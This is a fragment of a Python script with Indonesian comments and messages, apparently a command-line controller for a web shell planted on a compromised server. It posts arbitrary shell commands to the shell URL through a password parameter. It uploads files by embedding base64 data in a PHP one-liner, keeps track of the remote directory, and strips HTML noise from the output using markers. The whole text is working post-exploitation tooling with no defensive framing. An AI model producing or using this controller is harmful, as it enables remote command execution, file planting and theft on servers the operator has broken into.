                        b64_data = base64.b64encode(f_in.read()).decode('utf-8')
                    
                    # Perintah PHP one-liner di server untuk menulis ulang file dari base64
                    upl_payload = f"php -r \"file_put_contents('{l_file}', base64_decode('{b64_data}'));\""
                    res = requests.post(shell_url, data={password_param: upl_payload}, headers=headers, timeout=8)
                    print(f"[+] Proses upload selesai! Periksa folder target.\n")
                except Exception as e:
                    print(f"[-] Gagal mengunggah file: {e}\n")
                continue

            # 4. Stateful Directory Tracking & CD Command Handler
            if lower_cmd.startswith('cd '):
                target_folder = command.split(' ', 1)[1].strip()
                # Menggabungkan direktori lama dengan perintah cd, lalu ambil pwd terbaru
                stateful_cmd = f"cd {current_dir} && cd {target_folder} && pwd"
                res = requests.post(shell_url, data={password_param: stateful_cmd}, headers=headers, timeout=5)
                new_path = res.text.strip().split("\n")[-1].strip()
                if new_path.startswith('/'):
                    current_dir = new_path
                    print(f"[+] Direktori aktif berpindah ke: {current_dir}\n")
                else:
                    print(f"[-] Gagal berpindah direktori (Folder tidak ditemukan atau akses ditolak).\n")
                continue

            # 5. Standard Command Execution dengan Output Sanitizer (Marker Wrapper)
            # Menggunakan marker unik untuk membatasi murni hasil eksekusi perintah dari sampah HTML/PHP
            marker_start = "===TP_START==="
            marker_end = "===TP_END==="
            wrapped_command = f"cd {current_dir} && echo '{marker_start}' && ({command}) 2>&1 && echo '{marker_end}'"

            response = requests.post(shell_url, data={password_param: wrapped_command}, headers=headers, timeout=6)
            raw_output = response.text

            # Regex / String Splitting Sanitizer untuk membersihkan teks sampah luar marker
            if marker_start in raw_output and marker_end in raw_output:
                sanitized_output = raw_output.split(marker_start)[1].split(marker_end)[0].strip()
            else:
                sanitized_output = raw_output.strip()

            print("\n--- Output Eksekusi ---")
            print(sanitized_output if sanitized_output else "[*] Perintah berhasil dieksekusi tanpa output teks.")
            print("-----------------------\n")

        except KeyboardInterrupt:
            print("\n[*] Sesi dihentikan oleh pengguna.")
            break
        except Exception as e:
            print(f"[-] Koneksi ke web shell gagal atau terputus: {e}")

    input("\nTekan Enter untuk kembali ke menu utama...")

if __name__ == "__main__":
    main_menu()

